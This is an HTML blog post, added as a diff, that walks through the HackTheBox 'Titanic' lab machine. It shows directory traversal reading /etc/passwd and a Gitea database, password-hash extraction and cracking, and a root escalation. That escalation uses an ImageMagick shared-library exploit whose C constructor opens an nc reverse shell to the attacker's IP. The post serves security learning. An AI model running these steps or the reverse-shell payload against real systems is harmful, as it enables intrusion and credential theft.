@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Titanic – Will Lindsey</title>
+  <meta name="description" content="A walkthrough of HackTheBox's Titanic – directory traversal, Gitea database extraction, and an ImageMagick CVE for root.">
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><text y='32' font-size='32'>💻</text></svg>">
+</head>
+<body>
+  <header>
+    <nav>
+      <a href="/" class="site-title">Will Lindsey</a>
+      <ul>
+        <li><a href="/">About</a></li>
+        <li><a href="/blog/">Blog</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main>
+    <a href="/blog/" class="back-link">← Blog</a>
+    <div class="post-header">
+      <h1>Titanic</h1>
+      <div class="post-meta">
+        <time>Jun 22, 2025</time>
+        <span class="post-tags">
+          <span class="tag">hack-the-box</span>
+          <span class="tag">easy</span>
+          <span class="tag">cve</span>
+        </span>
+      </div>
+    </div>
+
+    <article>
+      <p>While enumerating the Titanic machine, I uncover a directory traversal vulnerability that exposes a database file on the remote server. Inside the database, I find a user password, which I crack and use to gain SSH access. Once on the box, I discover a cron job running every minute as root, invoking ImageMagick. The installed version is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/cve-2024-41817" target="_blank" rel="noopener noreferrer">CVE-2024-41817</a>, which I exploit to escalate privileges and gain a root shell.</p>
+
+      <h2>nmap scans</h2>
+
+      <p><code>nmap</code> finds two TCP ports. SSH is running on port 22 and HTTP is running on 80. Port 80 redirects to <code>http://titanic.htb</code>.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/Titanic/writeup]
+└─$ sudo nmap -p- -sC -sV -oN nmap/$(cat box).all.tcp.ports $(cat ip)
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-21 10:13 EDT
+Nmap scan report for 10.10.11.55
+Host is up (0.044s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
+|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://titanic.htb/
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 22.25 seconds</code></pre>
+
+      <p>I add <code>titanic.htb</code> to my <code>hosts</code> file. After adding it, <code>nmap</code> identifies port 80 is running <code>Werkzeug 3.0.3</code> on <code>python 3.10.12</code>. Title pages suggest this website can be used to book our trip on the sunken ship.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/Titanic/writeup]
+└─$ sudo nmap -p- -sC -sV -oN nmap/$(cat box).all.tcp.ports $(cat ip)
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-21 10:17 EDT
+Nmap scan report for titanic.htb (10.10.11.55)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52
+| http-server-header:
+|   Apache/2.4.52 (Ubuntu)
+|_  Werkzeug/3.0.3 Python/3.10.12
+|_http-title: Titanic - Book Your Ship Trip
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 22.37 seconds</code></pre>
+
+      <h2>Port 80 Enumeration</h2>
+
+      <h3>Browser</h3>
+      <p>Navigating to <code>http://titanic.htb</code> in my browser I see a Titanic themed website encouraging me to book a trip.</p>
+
+      <img src="/assets/img/titanic/1.png" alt="Titanic HTB website" class="post-img">
+
+      <p>While inspecting the <code>Book Now</code> form submission in Firefox Developer Tools, I notice a <code>POST</code> request sent to the <code>/book</code> endpoint. I also observe a <code>GET</code> request to the <code>/download</code> path with a <code>ticket</code> query parameter. The value of <code>ticket</code> appears to follow the format <code>UUID.json</code>.</p>
+
+      <img src="/assets/img/titanic/2.png" alt="Firefox dev tools showing /download endpoint" class="post-img">
+
+      <p>Using <code>curl</code> I see the request to <code>download?ticket=UUID.json</code> returns the form data attached as a <code>json</code> file.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/Titanic/writeup]
+└─$ curl http://titanic.htb/download?ticket=aaa10ac1-5d07-456b-9163-303cbb726683.json --verbose
+&lt; HTTP/1.1 200 OK
+&lt; Content-Disposition: attachment; filename=aaa10ac1-5d07-456b-9163-303cbb726683.json
+&lt; Content-Type: application/json
+{"name": "bill", "email": "bill@bill.htb", "phone": "5555555555", "date": "1920-01-01", "cabin": "Standard"}</code></pre>
+
+      <h3>Subdomain Enumeration</h3>
+      <p>Using <code>wfuzz</code> to brute-force subdomains, I identify a subdomain named <code>dev</code>.</p>
+
+<pre><code>└─$ wfuzz -H 'Host: FUZZ.titanic.htb' -u 'http://titanic.htb' -w /usr/share/seclists/Discovery/DNS/namelist.txt --hc 301,400
+
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+000034730:   200        275 L    1278 W     13870 Ch    "dev"</code></pre>
+
+      <p>I add <code>dev.titanic.htb</code> to my local <code>hosts</code> file.</p>
+
+      <h3>Browser dev.titanic.htb</h3>
+      <p>Visiting <code>dev.titanic.htb</code> in the browser shows a Gitea server.</p>
+
+      <img src="/assets/img/titanic/3.png" alt="Gitea server at dev.titanic.htb" class="post-img">
+
+      <p>Clicking explore I see two repositories <code>developer/docker-config</code> and <code>developer/flask-app</code>. I also see the version of the server is 1.22.1.</p>
+
+      <img src="/assets/img/titanic/4.png" alt="Gitea repositories" class="post-img">
+
+      <p>Browsing the <code>flask-app</code> repository, it becomes clear that this is the logic for <code>titanic.htb</code>. The <code>download_ticket()</code> function in <code>app.py</code> contains an input validation flaw: it appends the value of the <code>ticket</code> query parameter directly to the <code>TICKETS_DIR</code> path. The server then returns the file at the resulting path without validating the input.</p>
+
+      <img src="/assets/img/titanic/5.png" alt="Flask app source showing directory traversal vulnerability" class="post-img">
+
+      <p>I confirm this using <code>curl</code> by downloading <code>/etc/passwd</code> from the remote server.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/Titanic/writeup]
+└─$ curl http://titanic.htb/download?ticket=../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+developer:x:1000:1000:developer:/home/developer:/bin/bash</code></pre>
+
+      <h2>Exploiting Directory Traversal for User Access</h2>
+
+      <p>Going back to <code>dev.titanic.htb</code> and looking at the <code>docker-config</code> repository I identify an interesting path on the remote server, <code>/home/developer/gitea/data</code>.</p>
+
+      <img src="/assets/img/titanic/6.png" alt="docker-config repository showing gitea data path" class="post-img">
+
+      <p>I am interested in finding the <code>app.ini</code> file for Gitea. After some educated guesses based on the docker compose file, I find it:</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/Titanic/writeup]
+└─$ curl http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/conf/app.ini
+APP_NAME = Gitea: Git with a cup of tea
+RUN_MODE = prod
+RUN_USER = git
+WORK_PATH = /data/gitea
+...
+[database]
+PATH = /data/gitea/gitea.db
+DB_TYPE = sqlite3
+...</code></pre>
+
+      <p>I download the database file and use <code>sqlite3</code> to extract user hashes.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/Titanic/writeup]
+└─$ curl http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db -o gitea.db
+
+┌──(kali㉿kali)-[~/htb/Titanic/writeup]
+└─$ sqlite3 ./gitea.db "SELECT * FROM user;"
+1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|...
+2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|...</code></pre>
+
+      <p>I use a one-liner described by <a href="https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash" target="_blank" rel="noopener noreferrer">0xdf</a> to convert these hashes into a format crackable by <code>hashcat</code>.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/Titanic/writeup]
+└─$ sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
+administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
+developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=</code></pre>
+
+      <p>Using <code>hashcat</code> I discover the password for <code>developer</code> is <code>25282528</code>.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/Titanic/writeup]
+└─$ hashcat -m 10900 gitea.hashes /usr/share/wordlists/rockyou.txt --user
+
+sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528</code></pre>
+
+      <p>I use the newly found credentials to ssh to the machine.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/Titanic/writeup]
+└─$ ssh developer@$(cat ip)
+developer@10.10.11.55's password:
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)
+
+developer@titanic:~$ cat user.txt |wc
+      1       1      33</code></pre>
+
+      <h2>Root</h2>
+
+      <p>In the <code>/opt/scripts</code> directory, I find a script named <code>identify_images.sh</code> that runs <code>magick identify</code> on all files with the <code>.jpg</code> extension in <code>/opt/app/static/assets/images/</code>. The output is written to <code>/opt/app/static/assets/metadata.log</code>.</p>
+
+<pre><code>developer@titanic:/opt/scripts$ cat identify_images.sh
+cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify &gt;&gt; metadata.log</code></pre>
+
+      <p>I keep an eye on the <code>/opt/app/static/assets/images/</code> directory and notice that <code>metadata.log</code> updates every minute, indicating that <code>/opt/scripts/identify_images.sh</code> runs on a scheduled basis.</p>
+
+      <p>I discover the version of <code>ImageMagick</code> is <code>7.1.1-35</code>. This version is potentially vulnerable to a <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8" target="_blank" rel="noopener noreferrer">shared library attack</a>. Using the example provided in the GitHub advisory, I craft a shared library and place it in the script's execution directory. The library sends a reverse shell back to my machine.</p>
+
+      <p>First I set up a <code>nc</code> listener on port 9595.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/Titanic/writeup]
+└─$ nc -lvnp 9595
+listening on [any] 9595 ...</code></pre>
+
+      <p>I then compile the shared library function.</p>
+
+<pre><code>developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - &lt;&lt; EOF
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+__attribute__((constructor)) void init(){
+    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.8 9595 &gt;/tmp/f");
+    exit(0);
+}
+EOF</code></pre>
+
+      <p>After a minute of waiting, I receive a shell from root on my <code>nc</code> listener.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/Titanic/writeup]
+└─$ nc -lvnp 9595
+listening on [any] 9595 ...
+connect to [10.10.16.8] from (UNKNOWN) [10.10.11.55] 40698
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt |wc
+      1       1      33</code></pre>
+    </article>
+  </main>
+
+  <footer>
+    &copy; 2026 Will Lindsey
+  </footer>
+</body>
+</html>
